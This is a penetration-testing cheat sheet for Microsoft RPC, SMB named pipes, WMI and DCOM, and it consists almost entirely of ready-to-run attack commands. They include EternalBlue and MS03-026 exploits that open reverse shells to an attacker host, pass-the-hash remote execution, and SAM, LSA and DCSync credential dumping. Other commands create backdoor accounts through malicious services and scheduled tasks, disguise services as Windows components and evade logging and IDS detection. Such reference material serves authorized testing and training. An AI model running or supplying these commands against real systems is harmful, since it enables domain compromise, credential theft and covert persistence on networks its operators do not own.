# RPC Penetration Testing Cheat Sheet

> **Scope:** Enumeration, exploitation, and post-exploitation techniques targeting Microsoft RPC, DCE/RPC, MSRPC, and related services in authorized penetration testing engagements.

---

## Table of Contents

1. [Protocol Overview](#protocol-overview)
2. [Port & Service Reference](#port--service-reference)
3. [Enumeration](#enumeration)
4. [Vulnerability Assessment](#vulnerability-assessment)
5. [Exploitation](#exploitation)
6. [Post-Exploitation via RPC](#post-exploitation-via-rpc)
7. [Defense Evasion](#defense-evasion)
8. [Tooling Reference](#tooling-reference)
9. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Protocol Overview

| Protocol | Full Name | Transport | Notes |
|---|---|---|---|
| DCE/RPC | Distributed Computing Environment / RPC | TCP/UDP | Foundation for MSRPC |
| MSRPC | Microsoft Remote Procedure Call | TCP/UDP/SMB | Windows-native; uses named pipes |
| DCOM | Distributed Component Object Model | TCP 135 + dynamic | OLE/COM over network |
| WMI | Windows Management Instrumentation | TCP 135 + dynamic | Built on DCOM |
| NCacn_ip_tcp | Connection-oriented TCP transport | TCP dynamic | Common MSRPC transport |
| NCacn_np | Named pipe transport | SMB (445/139) | e.g. `\pipe\svcctl` |

### RPC Communication Flow

```
Client → EPM (TCP 135) → Get Dynamic Port → Connect to RPC Service
```

---

## Port & Service Reference

| Port | Protocol | Service | Notes |
|---|---|---|---|
| 135/tcp | MSRPC | Endpoint Mapper (EPM) | Always target first |
| 137/udp | NetBIOS-NS | Name Service | Enumeration |
| 138/udp | NetBIOS-DGM | Datagram Service | Enumeration |
| 139/tcp | NetBIOS-SSN | Session Service | Legacy SMB over NetBIOS |
| 445/tcp | SMB | Direct SMB (Named Pipes) | RPC over named pipes |
| 593/tcp | HTTP | RPC over HTTP | Firewall bypass vector |
| 1024–65535 | Dynamic | MSRPC dynamic endpoints | Assigned by EPM |

---

## Enumeration

### 1. Endpoint Mapper Enumeration

```bash
# rpcclient — null session
rpcclient -U "" -N <target_ip>

# rpcclient — authenticated
rpcclient -U "DOMAIN\user%Password123" <target_ip>

# List all registered endpoints
rpcclient $> epmapper

# Impacket — dump all endpoints
impacket-rpcdump @<target_ip>
impacket-rpcdump -port 135 <target_ip>

# Impacket — over SMB (port 445)
impacket-rpcdump -port 445 <target_ip>
```

### 2. RPC Interface Enumeration

```bash
# Enumerate all registered RPC interfaces
impacket-rpcdump @<target_ip> | grep -E "Protocol|Bindings|UUID"

# List known interfaces (pipe-based)
impacket-rpcdump -port 445 @<target_ip>

# Metasploit — endpoint mapper scan
use auxiliary/scanner/dcerpc/endpoint_mapper
set RHOSTS <target_ip>
run
```

### 3. Domain Enumeration via rpcclient

```bash
# Null session
rpcclient -U "" -N <dc_ip>

# --- User Enumeration ---
rpcclient $> enumdomusers          # List all domain users
rpcclient $> queryuser 0x1f4       # Query user by RID (0x1f4 = Administrator)
rpcclient $> enumdomusers | grep -oP '\[.*?\]' | tr -d '[]'

# --- Group Enumeration ---
rpcclient $> enumdomgroups         # List domain groups
rpcclient $> querygroup 0x200      # Query Domain Admins (RID 512)
rpcclient $> querygroupmem 0x200   # Members of group

# --- Password Policy ---
rpcclient $> getdompwinfo
rpcclient $> passpol

# --- Domain / OS Info ---
rpcclient $> srvinfo
rpcclient $> querydominfo

# --- Share Enumeration ---
rpcclient $> netshareenum
rpcclient $> netshareenumall

# --- Printer Enumeration ---
rpcclient $> enumprinters

# --- Lookup SIDs / Names ---
rpcclient $> lookupnames Administrator
rpcclient $> lookupsids S-1-5-21-<domain>-500

# --- RID Cycling (Brute-force User Enumeration) ---
for i in $(seq 500 1200); do
  rpcclient -U "" -N <dc_ip> -c "queryuser $(printf '0x%x' $i)" 2>/dev/null \
  | grep "User Name" && echo "RID: $i"
done
```

### 4. Automated Enumeration Tools

```bash
# enum4linux — comprehensive Linux RPC/SMB enumeration
enum4linux -a <target_ip>
enum4linux -U <target_ip>          # Users only
enum4linux -G <target_ip>          # Groups only
enum4linux -S <target_ip>          # Shares only
enum4linux -P <target_ip>          # Password policy

# enum4linux-ng — modern rewrite (Python)
enum4linux-ng -A <target_ip>
enum4linux-ng -A <target_ip> -u "user" -p "Pass123"
enum4linux-ng -A <target_ip> --yaml output.yaml

# Nmap RPC scripts
nmap -p 135,445 --script=msrpc-enum <target_ip>
nmap -p 135 --script=rpcinfo <target_ip>
nmap -sV -p 135,445 --script "rpc*" <target_ip>

# Metasploit — MS-RPC Scanner
use auxiliary/scanner/smb/pipe_auditor
set RHOSTS <target_range>
run
```

### 5. WMI Enumeration

```bash
# Impacket WMI queries
impacket-wmiexec DOMAIN/user:Password123@<target_ip> "select * from win32_computersystem"

# CrackMapExec WMI
crackmapexec smb <target_ip> -u user -p Password123 --wmi "SELECT * FROM Win32_Process"
crackmapexec smb <target_ip> -u user -p Password123 -M wmiexec

# wmic (Windows)
wmic /node:<target_ip> /user:DOMAIN\user /password:Password123 process list brief
wmic /node:<target_ip> /user:DOMAIN\user /password:Password123 computersystem get Name,Domain,Manufacturer
```

### 6. DCOM Enumeration

```bash
# Impacket — DCOM object enumeration
python3 -c "
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.dcom import wmi
# enumerate DCOM via OXID resolver
"

# Metasploit
use auxiliary/gather/dcom_enum
set RHOSTS <target_ip>
run
```

---

## Vulnerability Assessment

### Scanning for Vulnerabilities

```bash
# Nmap vulnerability scripts
nmap -p 135,445 --script=vuln <target_ip>
nmap -p 445 --script smb-vuln-ms17-010 <target_ip>
nmap -p 445 --script smb-vuln-ms08-067 <target_ip>
nmap -p 445 --script "smb-vuln*" <target_ip>

# Check for CVE-2022-26809 (RPC over TCP, port 135)
nmap -p 135 --script msrpc-enum <target_ip>

# Metasploit — SMB/RPC vulnerability check
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target_range>
run
```

---

## Exploitation

### 1. EternalBlue (MS17-010 / CVE-2017-0144)

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attacker_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Manual — check with impacket
impacket-smbclient //192.168.1.1/c$ -k -no-pass    # Kerberos (if pre-compromised)

# checker script
python3 checker.py <target_ip>    # from AutoBlue-MS17-010 repo
python3 zzz_exploit.py <target_ip> ntsvcs
```

### 2. DCOM / RPC Lateral Movement

```bash
# Impacket DCOM lateral movement (MMC20.Application)
impacket-dcomexec DOMAIN/user:Password@<target_ip> 'cmd.exe /c whoami > C:\output.txt'
impacket-dcomexec -object MMC20 DOMAIN/user:Password@<target_ip> 'cmd.exe'
impacket-dcomexec -object ShellWindows DOMAIN/user:Password@<target_ip> 'cmd.exe'
impacket-dcomexec -object ShellBrowserWindow DOMAIN/user:Password@<target_ip> 'cmd.exe'

# Hash-based (Pass-the-Hash)
impacket-dcomexec -hashes :NTLM_HASH DOMAIN/user@<target_ip> 'whoami'
```

### 3. WMI Exploitation

```bash
# Impacket WMI exec
impacket-wmiexec DOMAIN/user:Password@<target_ip>
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/user@<target_ip>

# CrackMapExec WMI
crackmapexec smb <target_ip> -u user -p Password -x "whoami"
crackmapexec smb <target_ip> -u user -p Password -X "powershell -enc <base64>"

# Metasploit WMI
use exploit/windows/smb/psexec
set SMBUser user
set SMBPass Password
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### 4. PsExec-style Attacks via RPC/SMB Named Pipes

```bash
# Impacket PSexec
impacket-psexec DOMAIN/user:Password@<target_ip>
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@<target_ip>

# SMBexec (fileless variant — no binary upload)
impacket-smbexec DOMAIN/user:Password@<target_ip>
impacket-smbexec -hashes :NTLM_HASH DOMAIN/user@<target_ip>

# Atexec (Task Scheduler via ATSVC named pipe)
impacket-atexec DOMAIN/user:Password@<target_ip> "whoami"

# CrackMapExec with various execution methods
crackmapexec smb <target_ip> -u user -p Password --exec-method smbexec -x "whoami"
crackmapexec smb <target_ip> -u user -p Password --exec-method wmiexec -x "whoami"
crackmapexec smb <target_ip> -u user -p Password --exec-method atexec -x "whoami"
crackmapexec smb <target_ip> -u user -p Password --exec-method mmcexec -x "whoami"
```

### 5. MS03-026 (Legacy — DCOM RPC Buffer Overflow)

```bash
# Metasploit (legacy targets only)
use exploit/windows/dcerpc/ms03_026_dcom
set RHOST <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit
```

### 6. RPC over HTTP (Firewall Bypass)

```bash
# When port 135 is blocked but 593 or 80/443 is open
# impacket rpcdump over HTTP
impacket-rpcdump -port 593 <target_ip>

# Nmap
nmap -p 593 --script msrpc-enum <target_ip>
```

---

## Post-Exploitation via RPC

### Service Control (SVCCTL Named Pipe)

```bash
rpcclient $> svcenum                          # List services
rpcclient $> svcquery <service_name>
rpcclient $> svcstart <service_name>
rpcclient $> svcstop <service_name>

# Create malicious service remotely
impacket-services DOMAIN/user:Password@<target_ip> create \
  -name "evilsvc" \
  -display "Windows Update Helper" \
  -path "cmd.exe /c net user hacker Password /add"

impacket-services DOMAIN/user:Password@<target_ip> start -name "evilsvc"
```

### Registry Access via RPC (WINREG)

```bash
rpcclient $> winreg_enumkey HKLM\\SOFTWARE
rpcclient $> winreg_queryvalue HKLM\\SAM\\SAM

# Impacket reg.py
impacket-reg DOMAIN/user:Password@<target_ip> query -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
```

### SAM / LSA Dumping via RPC

```bash
# Impacket secretsdump (uses DRSUAPI and SAMR RPC)
impacket-secretsdump DOMAIN/user:Password@<target_ip>
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/user@<target_ip>

# LSA secrets only
impacket-secretsdump -lsa DOMAIN/user:Password@<target_ip>

# DCSync (Domain Controller replication — uses DRSUAPI)
impacket-secretsdump -just-dc-ntlm DOMAIN/user:Password@<dc_ip>
impacket-secretsdump -just-dc-user Administrator DOMAIN/user:Password@<dc_ip>

# CrackMapExec
crackmapexec smb <target_ip> -u user -p Password --sam
crackmapexec smb <target_ip> -u user -p Password --lsa
crackmapexec smb <dc_ip> -u user -p Password --ntds
```

### Scheduled Task Creation (ATSVC / ITaskSchedulerService)

```bash
# Impacket atexec
impacket-atexec DOMAIN/user:Password@<target_ip> "net user backdoor Pass123! /add"

# rpcclient job scheduler
rpcclient $> jobaddjob
```

---

## Defense Evasion

### Named Pipe Selection

| Named Pipe | Associated Service | Stealth Level |
|---|---|---|
| `\pipe\svcctl` | Service Control Manager | Low (noisy) |
| `\pipe\atsvc` | Task Scheduler | Medium |
| `\pipe\epmapper` | Endpoint Mapper | Medium |
| `\pipe\srvsvc` | Server Service | Medium |
| `\pipe\winreg` | Remote Registry | Medium |
| `\pipe\wkssvc` | Workstation Service | High |
| `\pipe\browser` | Computer Browser | High |

```bash
# CrackMapExec — custom named pipe (avoid detection)
crackmapexec smb <target_ip> -u user -p Pass --exec-method smbexec \
  --pipe-name "browser" -x "whoami"

# Impacket psexec — custom service name and binary name
impacket-psexec -service-name "WindowsAudioSrv" \
  -remote-binary-name "audiodg.exe" \
  DOMAIN/user:Password@<target_ip>
```

### RPC over SMB vs. TCP

```bash
# Prefer SMB transport (port 445) to avoid port 135 IDS signatures
impacket-rpcdump -port 445 <target_ip>         # Enumerate via SMB
impacket-wmiexec DOMAIN/user:Pass@<target_ip>  # WMI over SMB by default
```

### Avoiding Logging

```bash
# Use Pass-the-Hash to avoid plaintext credential logging
impacket-psexec -hashes aad3b435...:NTLM_HASH DOMAIN/user@<target_ip>

# Kerberos (avoids NTLM authentication events)
export KRB5CCNAME=/tmp/user.ccache
impacket-psexec -k -no-pass DOMAIN/user@<target_ip>
```

---

## Tooling Reference

### Impacket Suite

| Tool | Purpose | Key Options |
|---|---|---|
| `impacket-rpcdump` | Enumerate RPC endpoints | `-port 135/445` |
| `impacket-psexec` | RPC+SMB shell (uploads binary) | `-hashes`, `-k` |
| `impacket-smbexec` | Fileless shell via SCM | `-hashes`, `-k` |
| `impacket-wmiexec` | WMI-based shell | `-hashes`, `-object` |
| `impacket-dcomexec` | DCOM-based shell | `-object MMC20/ShellWindows` |
| `impacket-atexec` | Task Scheduler execution | `"command"` |
| `impacket-secretsdump` | Credential dumping (SAMR/DRSUAPI) | `-just-dc-ntlm`, `-lsa` |
| `impacket-services` | Remote service management | `create/start/stop/delete` |
| `impacket-reg` | Remote registry access | `query/add/delete` |

### rpcclient Cheat Sheet

```bash
# Connection
rpcclient -U "" -N <ip>                             # Null session
rpcclient -U "domain\user%pass" <ip>               # Authenticated
rpcclient -U "user%pass" --pw-nt-hash <ip>         # NTLM hash

# User & Group Ops
enumdomusers      queryuser <RID>     enumdomgroups
querygroup <RID>  querygroupmem <RID> lookupnames <name>
lookupsids <SID>  getdompwinfo        querydominfo

# Network & Shares
netshareenum      netshareenumall     netsharegetinfo <share>
srvsvc            wkssvc

# Services & Jobs
svcenum           svcquery <svc>      svcstart <svc>    svcstop <svc>

# Printers
enumprinters      getprinter <name>

# Misc
srvinfo           lsaquery           lsaenumsid
```

### Nmap RPC Scripts

```bash
nmap -p 135,445 --script msrpc-enum <target>
nmap -p 135 --script rpcinfo <target>
nmap -p 445 --script "smb-vuln*" <target>
nmap -p 445 --script smb-enum-shares,smb-enum-users <target>
nmap -p 445 --script smb2-security-mode <target>
```

### CrackMapExec

```bash
# Auth testing
crackmapexec smb <range> -u user -p Password

# Enumeration
crackmapexec smb <target> -u user -p Pass --users
crackmapexec smb <target> -u user -p Pass --groups
crackmapexec smb <target> -u user -p Pass --shares
crackmapexec smb <target> -u user -p Pass --pass-pol

# Execution
crackmapexec smb <target> -u user -p Pass -x "whoami"
crackmapexec smb <target> -u user -p Pass -X "<powershell>"

# Credential Dumping
crackmapexec smb <target> -u user -p Pass --sam
crackmapexec smb <target> -u user -p Pass --lsa
crackmapexec smb <dc> -u user -p Pass --ntds
```

## Quick Reference — Attack Chain

```
1. DISCOVERY
   nmap -p 135,445 --script msrpc-enum,smb-vuln* <target>
   impacket-rpcdump @<target>

2. ENUMERATION
   enum4linux-ng -A <target>
   rpcclient -U "" -N <target> -c "enumdomusers"
   crackmapexec smb <target> -u "" -p "" --users --groups --shares

3. EXPLOITATION
   # Patch-level dependent
   impacket-psexec / smbexec / wmiexec / dcomexec

4. CREDENTIAL DUMPING
   impacket-secretsdump DOMAIN/user:Pass@<target>

5. LATERAL MOVEMENT
   impacket-dcomexec -object ShellWindows DOMAIN/user:Pass@<next_target>

6. DOMAIN COMPROMISE
   impacket-secretsdump -just-dc-ntlm DOMAIN/user:Pass@<dc>
```
